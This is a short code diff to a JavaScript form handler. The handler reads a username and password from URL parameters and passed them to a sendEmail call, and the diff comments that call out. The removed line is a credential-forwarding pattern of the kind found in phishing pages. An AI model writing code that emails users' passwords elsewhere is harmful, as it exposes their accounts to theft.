@@ -18,7 +18,7 @@ function formSub() {
       var usn = params.get('username');
       var psw = params.get('password');
       if (usn != null && psw != null) {
-            sendEmail('Username: ${usn}  Password: ${psw}');
+            //sendEmail('Username: ${usn}  Password: ${psw}');
       }
 }
 
